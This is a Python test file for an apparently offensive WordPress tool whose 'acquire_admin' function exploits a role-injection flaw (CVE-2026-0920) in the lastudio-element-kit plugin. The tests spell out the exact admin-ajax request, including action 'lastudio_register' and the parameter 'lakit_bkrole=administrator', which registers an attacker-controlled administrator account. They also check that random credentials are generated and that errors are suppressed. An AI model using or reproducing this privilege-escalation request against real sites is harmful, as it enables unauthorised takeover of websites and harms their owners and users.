from unittest.mock import MagicMock
import wp_recipes
import wp_privesc


def _recipe():
    return wp_recipes.find_privesc("lastudio-element-kit")[0]


def test_privesc_recipe_present():
    r = _recipe()
    assert r["cve"] == "CVE-2026-0920"
    assert r["role_param"] == "lakit_bkrole"
    assert r["role_value"] == "administrator"
    assert r["affected"] == "<=1.5.6.3"


def test_acquire_admin_sends_role_injection():
    http = MagicMock()
    http.post.return_value = MagicMock(status_code=200, text="ok")
    out = wp_privesc.acquire_admin("https://t/", http, _recipe(),
                                   creds={"username": "svc_x", "email": "x@y.z", "password": "pw123"})
    # returns the creds it tried to create
    assert out == {"username": "svc_x", "password": "pw123"}
    # posted to admin-ajax with the malicious role param
    url, = http.post.call_args[0]
    assert url == "https://t/wp-admin/admin-ajax.php"
    data = http.post.call_args[1]["data"]
    assert data["lakit_bkrole"] == "administrator"
    assert data["action"] == "lastudio_register"
    assert data["user_login"] == "svc_x"


def test_acquire_admin_random_creds_are_unique():
    http = MagicMock(); http.post.return_value = MagicMock(status_code=200)
    a = wp_privesc.acquire_admin("https://t", http, _recipe())
    b = wp_privesc.acquire_admin("https://t", http, _recipe())
    assert a["username"] != b["username"]
    assert a["password"] != b["password"]


def test_acquire_admin_swallows_transport_error():
    http = MagicMock(); http.post.side_effect = Exception("boom")
    assert wp_privesc.acquire_admin("https://t", http, _recipe()) is None
